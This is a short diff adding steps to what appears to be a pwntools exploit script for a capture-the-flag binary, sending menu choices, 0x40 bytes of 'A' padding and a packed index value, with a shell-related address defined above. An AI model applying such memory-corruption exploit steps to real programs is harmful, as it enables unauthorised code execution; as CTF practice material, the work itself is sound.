@@ -13,3 +13,14 @@ context.endian = 'little'
 context.log_level = 'debug'
 
 addr_sh = 0x80486b9
+
+p.sendafter('> ', b'F')
+p.sendafter('box input : ', b'A'*0x40)
+p.sendafter('> ', b'P')
+p.sendafter('Element index : ', p32(int('0x1a', 16)))
+p.sendafter('Element index : ', p32(int('0x1a', 16)))
+
+
+
+
+p.recvline()
